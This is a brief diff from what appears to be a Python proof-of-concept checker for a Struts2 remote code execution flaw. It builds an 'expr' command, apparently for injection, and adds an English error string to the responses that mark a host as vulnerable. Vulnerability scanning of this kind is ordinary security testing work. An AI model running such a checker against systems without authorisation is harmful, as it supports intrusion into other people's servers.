@@ -17,7 +17,7 @@ def poc(url):
     ran_check = ran_a - ran_b
     lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b)
     check = [ran_check, '无法初始化设备 PRN', '??????? PRN', '<Struts2-vuln-Goop>', '\Struts2-vuln-Goop',
-             '/Struts2-vuln-Goop', ]
+             '/Struts2-vuln-Goop', 'Unable to initialize device PRN']
     boundary_046 = "---------------------------735323031399963166993862150"
     headers_046 = {
         "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
